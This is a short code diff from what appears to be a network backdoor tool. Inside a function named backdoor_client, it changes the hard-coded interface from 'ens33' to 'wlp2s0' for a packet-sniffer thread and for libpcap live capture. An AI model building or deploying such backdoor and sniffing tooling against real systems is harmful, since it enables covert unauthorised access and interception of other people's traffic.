@@ -45,16 +45,16 @@ void backdoor_client(uint32 ipaddress, char* protocol)
 		perror("Invalid Protocol");
 	}
 
-	pthread_create(&pth_id, NULL, sniffer_thread, "ens33");
+	pthread_create(&pth_id, NULL, sniffer_thread, "wlp2s0");
 
 	// open the device for live capture
-	if ((pd = pcap_open_live("ens33", BUFSIZ, 1, 0, errbuf)) == NULL) {
+	if ((pd = pcap_open_live("wlp2s0", BUFSIZ, 1, 0, errbuf)) == NULL) {
 		printf("pcap_open_live(): %s\n", errbuf);
 		exit(1);
 	}
 
 	// get network device source IP address and netmask
-	if (pcap_lookupnet("ens33", &srcip, &netmask, errbuf) < 0) {
+	if (pcap_lookupnet("wlp2s0", &srcip, &netmask, errbuf) < 0) {
 		printf("pcap_lookupnet(): %s\n", errbuf);
 		exit(1);
 
